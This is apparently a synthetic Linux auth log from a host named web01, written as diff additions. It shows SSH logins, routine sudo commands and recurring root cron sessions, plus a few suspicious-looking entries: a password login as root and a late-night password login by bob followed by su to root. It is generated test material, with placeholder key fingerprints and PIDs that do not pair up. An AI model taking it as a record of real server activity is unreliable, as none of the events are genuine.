+Oct 14 10:53:29 web01 sudo: carol : TTY=pts/2 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct 14 11:00:14 web01 CRON[23422]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 11:00:15 web01 CRON[54296]: pam_unix(cron:session): session closed for user root
+Oct 14 11:05:00 web01 sshd[28947]: Accepted password for root from 192.0.2.10 port 57610 ssh2
+Oct 14 11:10:33 web01 sshd[22568]: Accepted publickey for bob from 10.0.0.35 port 51704 ssh2: ED25519 SHA256:x
+Oct 14 11:10:34 web01 systemd-logind[38576]: New session 6921 of user bob.
+Oct 14 11:10:45 web01 CRON[40778]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 11:10:46 web01 CRON[58487]: pam_unix(cron:session): session closed for user root
+Oct 14 11:12:33 web01 sudo: bob : TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+Oct 14 11:17:27 web01 sshd[45838]: Accepted publickey for bob from 10.0.0.14 port 40649 ssh2: ED25519 SHA256:x
+Oct 14 11:17:28 web01 systemd-logind[20168]: New session 4224 of user bob.
+Oct 14 11:19:27 web01 sudo: bob : TTY=pts/5 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 14 11:20:48 web01 CRON[2971]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 11:20:49 web01 CRON[32335]: pam_unix(cron:session): session closed for user root
+Oct 14 11:21:29 web01 sshd[15217]: Received disconnect from 10.0.0.27 port 46154:11: disconnected by user
+Oct 14 11:30:08 web01 CRON[15388]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 11:30:09 web01 CRON[50636]: pam_unix(cron:session): session closed for user root
+Oct 14 11:40:16 web01 CRON[6471]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 11:40:17 web01 CRON[56788]: pam_unix(cron:session): session closed for user root
+Oct 14 11:40:33 web01 sshd[51760]: Received disconnect from 10.0.0.35 port 57719:11: disconnected by user
+Oct 14 11:47:27 web01 sshd[21111]: Received disconnect from 10.0.0.14 port 35350:11: disconnected by user
+Oct 14 11:48:58 web01 sshd[24052]: Accepted publickey for alice from 10.0.0.19 port 55852 ssh2: ED25519 SHA256:x
+Oct 14 11:48:59 web01 systemd-logind[56425]: New session 4321 of user alice.
+Oct 14 11:50:09 web01 CRON[20691]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 11:50:10 web01 CRON[56775]: pam_unix(cron:session): session closed for user root
+Oct 14 11:50:58 web01 sudo: alice : TTY=pts/2 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct 14 12:00:53 web01 CRON[57579]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 12:00:54 web01 CRON[10390]: pam_unix(cron:session): session closed for user root
+Oct 14 12:05:44 web01 sshd[21714]: Accepted publickey for alice from 10.0.0.30 port 57079 ssh2: ED25519 SHA256:x
+Oct 14 12:05:45 web01 systemd-logind[62421]: New session 8892 of user alice.
+Oct 14 12:07:44 web01 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+Oct 14 12:09:56 web01 sshd[16739]: Failed password for carol from 10.0.0.18 port 54129 ssh2
+Oct 14 12:10:01 web01 sshd[32940]: Accepted publickey for carol from 10.0.0.18 port 60113 ssh2: ED25519 SHA256:x
+Oct 14 12:10:02 web01 systemd-logind[41008]: New session 2246 of user carol.
+Oct 14 12:10:27 web01 CRON[18215]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 12:10:28 web01 CRON[27802]: pam_unix(cron:session): session closed for user root
+Oct 14 12:12:01 web01 sudo: carol : TTY=pts/1 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct 14 12:18:58 web01 sshd[53456]: Received disconnect from 10.0.0.19 port 38900:11: disconnected by user
+Oct 14 12:20:31 web01 CRON[24470]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 12:20:32 web01 CRON[2881]: pam_unix(cron:session): session closed for user root
+Oct 14 12:30:57 web01 CRON[57395]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 12:30:58 web01 CRON[6866]: pam_unix(cron:session): session closed for user root
+Oct 14 12:32:44 web01 sshd[58912]: Accepted publickey for alice from 10.0.0.24 port 33882 ssh2: ED25519 SHA256:x
+Oct 14 12:32:45 web01 systemd-logind[45595]: New session 2941 of user alice.
+Oct 14 12:35:44 web01 sshd[16608]: Received disconnect from 10.0.0.30 port 57744:11: disconnected by user
+Oct 14 12:40:01 web01 sshd[56980]: Received disconnect from 10.0.0.18 port 36272:11: disconnected by user
+Oct 14 12:40:55 web01 CRON[52352]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 12:40:56 web01 CRON[60840]: pam_unix(cron:session): session closed for user root
+Oct 14 12:46:47 web01 sshd[47531]: Accepted publickey for alice from 10.0.0.23 port 39606 ssh2: ED25519 SHA256:x
+Oct 14 12:46:48 web01 systemd-logind[42565]: New session 7296 of user alice.
+Oct 14 12:48:47 web01 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 14 12:50:57 web01 CRON[47499]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 12:50:58 web01 CRON[9668]: pam_unix(cron:session): session closed for user root
+Oct 14 13:00:50 web01 CRON[15556]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 13:00:51 web01 CRON[1984]: pam_unix(cron:session): session closed for user root
+Oct 14 13:02:44 web01 sshd[15081]: Received disconnect from 10.0.0.24 port 37985:11: disconnected by user
+Oct 14 13:10:15 web01 CRON[25633]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 13:10:16 web01 CRON[3413]: pam_unix(cron:session): session closed for user root
+Oct 14 13:16:47 web01 sshd[61751]: Received disconnect from 10.0.0.23 port 47107:11: disconnected by user
+Oct 14 13:20:14 web01 CRON[46518]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 13:20:15 web01 CRON[11683]: pam_unix(cron:session): session closed for user root
+Oct 14 13:29:18 web01 sshd[18652]: Failed password for carol from 10.0.0.35 port 54065 ssh2
+Oct 14 13:29:23 web01 sshd[53069]: Accepted publickey for carol from 10.0.0.35 port 57491 ssh2: ED25519 SHA256:x
+Oct 14 13:29:24 web01 systemd-logind[24108]: New session 6132 of user carol.
+Oct 14 13:30:45 web01 CRON[18135]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 13:30:46 web01 CRON[54571]: pam_unix(cron:session): session closed for user root
+Oct 14 13:40:35 web01 CRON[59972]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 13:40:36 web01 CRON[12142]: pam_unix(cron:session): session closed for user root
+Oct 14 13:50:43 web01 CRON[62098]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 13:50:44 web01 CRON[16979]: pam_unix(cron:session): session closed for user root
+Oct 14 13:59:23 web01 sshd[41031]: Received disconnect from 10.0.0.35 port 54906:11: disconnected by user
+Oct 14 14:00:17 web01 CRON[54157]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 14:00:18 web01 CRON[33282]: pam_unix(cron:session): session closed for user root
+Oct 14 14:10:13 web01 CRON[36280]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 14:10:14 web01 CRON[4360]: pam_unix(cron:session): session closed for user root
+Oct 14 14:20:56 web01 CRON[51864]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 14:20:57 web01 CRON[18693]: pam_unix(cron:session): session closed for user root
+Oct 14 14:22:12 web01 sshd[35102]: Accepted publickey for bob from 10.0.0.14 port 55912 ssh2: ED25519 SHA256:x
+Oct 14 14:22:13 web01 systemd-logind[21495]: New session 9482 of user bob.
+Oct 14 14:30:20 web01 CRON[32642]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 14:30:21 web01 CRON[47372]: pam_unix(cron:session): session closed for user root
+Oct 14 14:40:59 web01 CRON[44500]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 14:41:00 web01 CRON[58952]: pam_unix(cron:session): session closed for user root
+Oct 14 14:50:54 web01 CRON[61921]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 14:50:55 web01 CRON[31968]: pam_unix(cron:session): session closed for user root
+Oct 14 14:52:12 web01 sshd[19600]: Received disconnect from 10.0.0.14 port 56426:11: disconnected by user
+Oct 14 15:00:01 web01 CRON[41106]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 15:00:02 web01 CRON[40361]: pam_unix(cron:session): session closed for user root
+Oct 14 15:10:25 web01 CRON[29694]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 15:10:26 web01 CRON[50578]: pam_unix(cron:session): session closed for user root
+Oct 14 15:20:20 web01 CRON[47432]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 15:20:21 web01 CRON[7335]: pam_unix(cron:session): session closed for user root
+Oct 14 15:30:16 web01 CRON[53587]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 15:30:17 web01 CRON[61009]: pam_unix(cron:session): session closed for user root
+Oct 14 15:40:18 web01 CRON[43803]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 15:40:19 web01 CRON[5934]: pam_unix(cron:session): session closed for user root
+Oct 14 15:50:04 web01 CRON[19601]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 15:50:05 web01 CRON[48575]: pam_unix(cron:session): session closed for user root
+Oct 14 16:00:53 web01 CRON[30568]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 16:00:54 web01 CRON[18820]: pam_unix(cron:session): session closed for user root
+Oct 14 16:01:07 web01 sshd[60855]: Accepted publickey for bob from 10.0.0.30 port 47094 ssh2: ED25519 SHA256:x
+Oct 14 16:01:08 web01 systemd-logind[56500]: New session 2081 of user bob.
+Oct 14 16:10:53 web01 CRON[42263]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 16:10:54 web01 CRON[63725]: pam_unix(cron:session): session closed for user root
+Oct 14 16:20:17 web01 CRON[42347]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 16:20:18 web01 CRON[3617]: pam_unix(cron:session): session closed for user root
+Oct 14 16:30:24 web01 CRON[58862]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 16:30:25 web01 CRON[14351]: pam_unix(cron:session): session closed for user root
+Oct 14 16:31:07 web01 sshd[54675]: Received disconnect from 10.0.0.30 port 38735:11: disconnected by user
+Oct 14 16:40:55 web01 CRON[35497]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 16:40:56 web01 CRON[13419]: pam_unix(cron:session): session closed for user root
+Oct 14 16:50:12 web01 CRON[44740]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 16:50:13 web01 CRON[55931]: pam_unix(cron:session): session closed for user root
+Oct 14 17:00:02 web01 CRON[46155]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 17:00:03 web01 CRON[64693]: pam_unix(cron:session): session closed for user root
+Oct 14 17:10:07 web01 CRON[17120]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 17:10:08 web01 CRON[42135]: pam_unix(cron:session): session closed for user root
+Oct 14 17:20:34 web01 CRON[60872]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 17:20:35 web01 CRON[18159]: pam_unix(cron:session): session closed for user root
+Oct 14 17:30:16 web01 CRON[62241]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 17:30:17 web01 CRON[17891]: pam_unix(cron:session): session closed for user root
+Oct 14 17:40:21 web01 CRON[12739]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 17:40:22 web01 CRON[57742]: pam_unix(cron:session): session closed for user root
+Oct 14 17:50:44 web01 CRON[52290]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 17:50:45 web01 CRON[47790]: pam_unix(cron:session): session closed for user root
+Oct 14 18:00:50 web01 CRON[55780]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 18:00:51 web01 CRON[14211]: pam_unix(cron:session): session closed for user root
+Oct 14 18:10:28 web01 CRON[37347]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 18:10:29 web01 CRON[61071]: pam_unix(cron:session): session closed for user root
+Oct 14 18:20:31 web01 CRON[54331]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 18:20:32 web01 CRON[58261]: pam_unix(cron:session): session closed for user root
+Oct 14 18:30:08 web01 CRON[6267]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 18:30:09 web01 CRON[10277]: pam_unix(cron:session): session closed for user root
+Oct 14 18:40:06 web01 CRON[7627]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 18:40:07 web01 CRON[29473]: pam_unix(cron:session): session closed for user root
+Oct 14 18:50:29 web01 CRON[4553]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 18:50:30 web01 CRON[61511]: pam_unix(cron:session): session closed for user root
+Oct 14 19:00:34 web01 CRON[27440]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 19:00:35 web01 CRON[5683]: pam_unix(cron:session): session closed for user root
+Oct 14 19:10:51 web01 CRON[25076]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 19:10:52 web01 CRON[33823]: pam_unix(cron:session): session closed for user root
+Oct 14 19:20:00 web01 CRON[60538]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 19:20:01 web01 CRON[59658]: pam_unix(cron:session): session closed for user root
+Oct 14 19:30:27 web01 CRON[4877]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 19:30:28 web01 CRON[26474]: pam_unix(cron:session): session closed for user root
+Oct 14 19:40:37 web01 CRON[4652]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 19:40:38 web01 CRON[26435]: pam_unix(cron:session): session closed for user root
+Oct 14 19:50:58 web01 CRON[15796]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 19:50:59 web01 CRON[43903]: pam_unix(cron:session): session closed for user root
+Oct 14 20:00:27 web01 CRON[22155]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 20:00:28 web01 CRON[43632]: pam_unix(cron:session): session closed for user root
+Oct 14 20:10:33 web01 CRON[17975]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 20:10:34 web01 CRON[53196]: pam_unix(cron:session): session closed for user root
+Oct 14 20:20:34 web01 CRON[17751]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 20:20:35 web01 CRON[21888]: pam_unix(cron:session): session closed for user root
+Oct 14 20:30:12 web01 CRON[31357]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 20:30:13 web01 CRON[3570]: pam_unix(cron:session): session closed for user root
+Oct 14 20:40:11 web01 CRON[48320]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 20:40:12 web01 CRON[58559]: pam_unix(cron:session): session closed for user root
+Oct 14 20:50:32 web01 CRON[50469]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 20:50:33 web01 CRON[39890]: pam_unix(cron:session): session closed for user root
+Oct 14 21:00:09 web01 CRON[22047]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 21:00:10 web01 CRON[30134]: pam_unix(cron:session): session closed for user root
+Oct 14 21:10:39 web01 CRON[15828]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 21:10:40 web01 CRON[3282]: pam_unix(cron:session): session closed for user root
+Oct 14 21:20:04 web01 CRON[36811]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 21:20:05 web01 CRON[48720]: pam_unix(cron:session): session closed for user root
+Oct 14 21:30:07 web01 CRON[39482]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 21:30:08 web01 CRON[3150]: pam_unix(cron:session): session closed for user root
+Oct 14 21:40:11 web01 CRON[49372]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 21:40:12 web01 CRON[59675]: pam_unix(cron:session): session closed for user root
+Oct 14 21:50:08 web01 CRON[53469]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 21:50:09 web01 CRON[58130]: pam_unix(cron:session): session closed for user root
+Oct 14 22:00:24 web01 CRON[53555]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 22:00:25 web01 CRON[23415]: pam_unix(cron:session): session closed for user root
+Oct 14 22:10:35 web01 CRON[23783]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 22:10:36 web01 CRON[34365]: pam_unix(cron:session): session closed for user root
+Oct 14 22:20:59 web01 CRON[8586]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 22:21:00 web01 CRON[39921]: pam_unix(cron:session): session closed for user root
+Oct 14 22:30:14 web01 CRON[45038]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 22:30:15 web01 CRON[30391]: pam_unix(cron:session): session closed for user root
+Oct 14 22:40:48 web01 CRON[29327]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 22:40:49 web01 CRON[62282]: pam_unix(cron:session): session closed for user root
+Oct 14 22:50:27 web01 CRON[49129]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 22:50:28 web01 CRON[40657]: pam_unix(cron:session): session closed for user root
+Oct 14 23:00:54 web01 CRON[20992]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 23:00:55 web01 CRON[25890]: pam_unix(cron:session): session closed for user root
+Oct 14 23:10:11 web01 CRON[16633]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 23:10:12 web01 CRON[57462]: pam_unix(cron:session): session closed for user root
+Oct 14 23:20:58 web01 CRON[45445]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 23:20:59 web01 CRON[23339]: pam_unix(cron:session): session closed for user root
+Oct 14 23:30:38 web01 CRON[60625]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 23:30:39 web01 CRON[10395]: pam_unix(cron:session): session closed for user root
+Oct 14 23:40:00 web01 sshd[43042]: Accepted password for bob from 10.0.0.23 port 32807 ssh2
+Oct 14 23:40:23 web01 CRON[18542]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 23:40:24 web01 CRON[53030]: pam_unix(cron:session): session closed for user root
+Oct 14 23:41:00 web01 su[45104]: pam_unix(su:session): session opened for user root(uid=0) by bob(uid=1001)
+Oct 14 23:50:13 web01 CRON[20656]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 14 23:50:14 web01 CRON[14077]: pam_unix(cron:session): session closed for user root
+Oct 15 00:00:01 web01 CRON[45049]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 00:00:02 web01 CRON[58548]: pam_unix(cron:session): session closed for user root
+Oct 15 00:10:28 web01 CRON[20102]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 00:10:29 web01 CRON[9634]: pam_unix(cron:session): session closed for user root
+Oct 15 00:20:34 web01 CRON[60227]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 00:20:35 web01 CRON[35430]: pam_unix(cron:session): session closed for user root
+Oct 15 00:30:54 web01 CRON[35363]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 00:30:55 web01 CRON[44536]: pam_unix(cron:session): session closed for user root
+Oct 15 00:40:10 web01 CRON[42611]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 00:40:11 web01 CRON[27951]: pam_unix(cron:session): session closed for user root
+Oct 15 00:50:17 web01 CRON[37523]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 00:50:18 web01 CRON[51093]: pam_unix(cron:session): session closed for user root
+Oct 15 01:00:53 web01 CRON[22550]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 01:00:54 web01 CRON[51486]: pam_unix(cron:session): session closed for user root
+Oct 15 01:10:07 web01 CRON[32240]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 01:10:08 web01 CRON[13071]: pam_unix(cron:session): session closed for user root
+Oct 15 01:20:30 web01 CRON[34070]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 01:20:31 web01 CRON[12666]: pam_unix(cron:session): session closed for user root
+Oct 15 01:30:54 web01 CRON[35782]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 01:30:55 web01 CRON[46862]: pam_unix(cron:session): session closed for user root
+Oct 15 01:40:42 web01 CRON[10311]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 01:40:43 web01 CRON[39177]: pam_unix(cron:session): session closed for user root
+Oct 15 01:50:22 web01 CRON[22029]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 01:50:23 web01 CRON[24629]: pam_unix(cron:session): session closed for user root
+Oct 15 02:00:01 web01 CRON[19022]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 02:00:02 web01 CRON[64734]: pam_unix(cron:session): session closed for user root
+Oct 15 02:10:04 web01 CRON[52825]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 02:10:05 web01 CRON[47097]: pam_unix(cron:session): session closed for user root
+Oct 15 02:20:19 web01 CRON[28184]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 02:20:20 web01 CRON[6737]: pam_unix(cron:session): session closed for user root
+Oct 15 02:30:06 web01 CRON[63679]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 02:30:07 web01 CRON[14194]: pam_unix(cron:session): session closed for user root
+Oct 15 02:40:05 web01 CRON[28987]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 02:40:06 web01 CRON[21997]: pam_unix(cron:session): session closed for user root
+Oct 15 02:50:37 web01 CRON[55488]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 02:50:38 web01 CRON[45257]: pam_unix(cron:session): session closed for user root
+Oct 15 03:00:05 web01 CRON[52813]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 03:00:06 web01 CRON[50297]: pam_unix(cron:session): session closed for user root
+Oct 15 03:10:50 web01 CRON[21901]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 03:10:51 web01 CRON[53786]: pam_unix(cron:session): session closed for user root
+Oct 15 03:20:35 web01 CRON[33918]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 03:20:36 web01 CRON[49795]: pam_unix(cron:session): session closed for user root
+Oct 15 03:30:13 web01 CRON[53849]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 03:30:14 web01 CRON[30836]: pam_unix(cron:session): session closed for user root
+Oct 15 03:40:40 web01 CRON[7810]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 03:40:41 web01 CRON[29776]: pam_unix(cron:session): session closed for user root
+Oct 15 03:50:32 web01 CRON[27292]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 03:50:33 web01 CRON[22657]: pam_unix(cron:session): session closed for user root
+Oct 15 04:00:11 web01 CRON[27547]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 04:00:12 web01 CRON[15375]: pam_unix(cron:session): session closed for user root
+Oct 15 04:10:45 web01 CRON[60243]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 04:10:46 web01 CRON[5483]: pam_unix(cron:session): session closed for user root
+Oct 15 04:20:02 web01 CRON[53077]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 04:20:03 web01 CRON[32649]: pam_unix(cron:session): session closed for user root
+Oct 15 04:30:00 web01 CRON[59877]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 04:30:01 web01 CRON[12323]: pam_unix(cron:session): session closed for user root
+Oct 15 04:40:02 web01 CRON[17847]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 04:40:03 web01 CRON[9196]: pam_unix(cron:session): session closed for user root
+Oct 15 04:50:55 web01 CRON[13504]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 04:50:56 web01 CRON[50690]: pam_unix(cron:session): session closed for user root
+Oct 15 05:00:02 web01 CRON[1356]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 05:00:03 web01 CRON[33520]: pam_unix(cron:session): session closed for user root
+Oct 15 05:10:36 web01 CRON[19605]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 05:10:37 web01 CRON[23434]: pam_unix(cron:session): session closed for user root
+Oct 15 05:20:40 web01 CRON[40812]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 05:20:41 web01 CRON[39309]: pam_unix(cron:session): session closed for user root
+Oct 15 05:30:39 web01 CRON[36545]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 05:30:40 web01 CRON[58282]: pam_unix(cron:session): session closed for user root
+Oct 15 05:40:12 web01 CRON[10491]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 05:40:13 web01 CRON[13187]: pam_unix(cron:session): session closed for user root
+Oct 15 05:50:08 web01 CRON[2031]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 05:50:09 web01 CRON[8157]: pam_unix(cron:session): session closed for user root
+Oct 15 06:00:52 web01 CRON[16746]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 06:00:53 web01 CRON[11560]: pam_unix(cron:session): session closed for user root
+Oct 15 06:10:06 web01 CRON[34292]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 06:10:07 web01 CRON[41218]: pam_unix(cron:session): session closed for user root
+Oct 15 06:20:59 web01 CRON[33107]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 06:21:00 web01 CRON[51881]: pam_unix(cron:session): session closed for user root
+Oct 15 06:30:05 web01 CRON[63306]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 06:30:06 web01 CRON[15987]: pam_unix(cron:session): session closed for user root
+Oct 15 06:40:57 web01 CRON[16895]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 06:40:58 web01 CRON[11460]: pam_unix(cron:session): session closed for user root
+Oct 15 06:50:26 web01 CRON[5111]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 06:50:27 web01 CRON[55723]: pam_unix(cron:session): session closed for user root
+Oct 15 07:00:42 web01 CRON[47678]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 07:00:43 web01 CRON[25590]: pam_unix(cron:session): session closed for user root
+Oct 15 07:10:24 web01 CRON[13930]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 07:10:25 web01 CRON[13653]: pam_unix(cron:session): session closed for user root
+Oct 15 07:20:50 web01 CRON[10384]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 07:20:51 web01 CRON[21867]: pam_unix(cron:session): session closed for user root
+Oct 15 07:30:59 web01 CRON[49090]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 07:31:00 web01 CRON[1393]: pam_unix(cron:session): session closed for user root
+Oct 15 07:40:36 web01 CRON[51229]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 07:40:37 web01 CRON[51091]: pam_unix(cron:session): session closed for user root
+Oct 15 07:50:45 web01 CRON[13199]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 07:50:46 web01 CRON[42828]: pam_unix(cron:session): session closed for user root
+Oct 15 08:00:23 web01 CRON[61640]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 08:00:24 web01 CRON[13789]: pam_unix(cron:session): session closed for user root
+Oct 15 08:10:53 web01 CRON[19147]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 08:10:54 web01 CRON[41628]: pam_unix(cron:session): session closed for user root
+Oct 15 08:20:24 web01 CRON[11502]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 15 08:20:25 web01 CRON[49436]: pam_unix(cron:session): session closed for user root
+Oct 15 08:30:57 web01 CRON[57464]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
